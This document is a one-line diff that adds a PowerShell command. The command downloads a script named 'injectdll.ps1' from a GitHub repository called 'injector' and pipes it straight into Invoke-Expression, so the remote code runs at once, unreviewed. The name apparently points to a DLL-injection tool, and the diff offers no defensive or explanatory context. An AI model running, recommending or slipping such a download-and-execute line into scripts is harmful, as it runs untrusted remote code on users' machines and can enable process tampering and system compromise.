@@ -1,0 +1,1 @@
+irm https://raw.githubusercontent.com/tasfik1974/injector/main/injectdll.ps1 | iex
